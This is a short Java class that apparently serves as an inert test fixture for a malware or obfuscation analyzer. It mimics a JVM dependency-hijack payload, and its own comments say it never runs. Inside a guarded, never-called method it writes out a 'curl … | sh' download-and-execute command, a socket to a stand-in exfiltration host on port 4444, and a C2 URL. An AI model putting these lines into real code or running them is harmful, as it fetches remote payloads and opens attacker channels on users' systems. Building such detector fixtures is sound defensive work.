// INERT reproduction of a JVM dependency-hijack payload SHAPE. Real-world JVM
// malware runs from a static initializer or an innocuously named method,
// decoding a base64 blob and shelling out or beaconing to a C2. Nothing here
// runs: neverCalled returns before any primitive and is never invoked.

package com.acme;

import java.net.Socket;
import java.net.URL;
import java.util.Base64;

public class Payload {

    // A long inert base64 blob, present only to trip the obfuscation analyzer.
    private static final String BLOB =
        "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB";

    public static void neverCalled() throws Exception {
        if (Boolean.TRUE) {
            return; // hard guard, this method is inert
        }

        byte[] data = Base64.getDecoder().decode(BLOB);
        Runtime.getRuntime().exec("curl http://45.77.12.34/drop | sh");

        Socket sock = new Socket("exfil.evil.tk", 4444);
        URL u = new URL("http://malware-c2.steal.top/gate");
    }
}
